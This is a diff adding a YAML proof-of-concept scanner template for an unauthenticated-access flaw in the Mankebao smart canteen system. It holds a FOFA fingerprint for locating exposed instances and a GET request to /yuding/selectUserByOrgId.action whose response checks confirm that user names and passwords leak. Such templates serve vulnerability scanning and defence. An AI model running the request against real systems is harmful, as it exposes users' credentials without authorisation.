@@ -1,0 +1,16 @@
+id: poc-yaml-mankebao-selectuserbyorgid-unauthorized-access
+info:
+  name: 满客宝智慧食堂系统 selectUserByOrgId 未授权访问漏洞
+  severity: medium
+  tags:
+  - 未授权访问
+  finger: 满客宝智慧食堂系统
+  fofa: body="满客宝后台管理系统"
+requests:
+- method: GET
+  path: /yuding/selectUserByOrgId.action?record=
+  expression: "status_code == 200 && \ncontains(body,\"\\\"success\\\":true\") &&\n\
+    matches(body,`\\\"password\\\":\".*?\"`) &&\ncontains(body,\"\\\"userName\\\"\
+    :\") &&\n!contains(body,\"<\")\n"
+variables: {}
+transport: http
